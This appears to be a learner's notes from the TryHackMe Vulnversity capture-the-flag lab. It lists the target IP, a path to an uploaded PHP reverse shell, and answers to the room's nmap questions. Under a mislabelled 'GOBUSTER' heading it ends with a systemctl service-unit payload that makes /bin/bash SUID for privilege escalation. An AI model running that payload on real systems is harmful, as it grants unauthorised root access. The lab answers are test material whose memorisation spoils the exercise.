# I.P

10.10.235.201

http://10.10.235.201:3333/internal/uploads/php-reverse-shell.phtml
A. Learning NMAP
#nmap results:
/tryhackme/vulnversity/nmap/initial

1. Scan this box: nmap -sV <machines ip>

2. Scan the box, how many ports are open?

Ans - 6

3. What version of the squid proxy is running on the machine?

Ans - 3.5.12

4. How many ports will nmap scan if the flag -p-400 was used?

Ans - 400

5. Using the nmap flag -n what will it not resolve?

Ans - n (No DNS resolution) Tells Nmap to never do reverse DNS

6. What is the most likely operating system this machine is running?

Ans - ubuntu

7. What port is the web server running on?

Ans - 3333

8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

# B. GOBUSTER

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF